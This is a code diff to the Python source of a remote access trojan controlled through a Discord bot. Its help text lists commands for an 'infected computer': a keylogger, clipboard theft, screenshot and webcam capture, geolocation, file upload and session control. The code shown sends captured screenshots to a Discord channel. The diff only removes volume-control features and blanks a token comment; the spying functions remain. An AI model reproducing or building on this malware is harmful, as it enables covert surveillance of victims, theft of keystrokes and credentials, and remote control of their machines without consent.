@@ -13,7 +13,7 @@ from discord.ext import commands
 from ctypes import *
 import asyncio
 from discord import utils
-token = '' #Enter your token here
+token = ''
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
@@ -33,15 +33,12 @@ Availaible commands are :
 --> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
-
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
-
 --> !idletime = Get the idle time of user
-
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
 --> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
@@ -108,19 +105,6 @@ async def on_ready():
     game = discord.Game(f"Window logging stopped")
     await client.change_presence(status=discord.Status.online, activity=game)
     
-def volumeup():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    if volume.GetMute() == 1:
-        volume.SetMute(0, None)
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
-
-def volumedown():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
 
 @client.event
 async def on_message(message):
@@ -178,13 +162,6 @@ async def on_message(message):
             await message.channel.send("[*] Command successfully executed", file=file)
             os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
 
-        if message.content == "!volumemax":
-            volumeup()
-            await message.channel.send("[*] Volume put to 100%")
-
-        if message.content == "!volumezero":
-            volumedown()
-            await message.channel.send("[*] Volume put to 0%")
 
         if message.content == "!webcampic": #Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
             import os
